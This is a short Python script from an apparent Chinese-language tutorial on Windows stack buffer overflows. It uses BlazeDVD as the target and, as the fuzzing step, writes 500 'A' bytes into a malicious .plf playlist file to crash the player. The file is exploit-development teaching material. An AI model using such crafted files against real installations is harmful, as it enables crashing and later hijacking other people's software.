#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""Windows 缓冲区溢出

基于栈的缓冲区溢出

以 BlazeDVD https://www.exploit-db.com/exploits/26889 应用为例

第一步：Fuzzing
"""


junk = "\x41" * 500
x = open('blazeExpl.plf', 'w')
x.write(junk)
x.close()
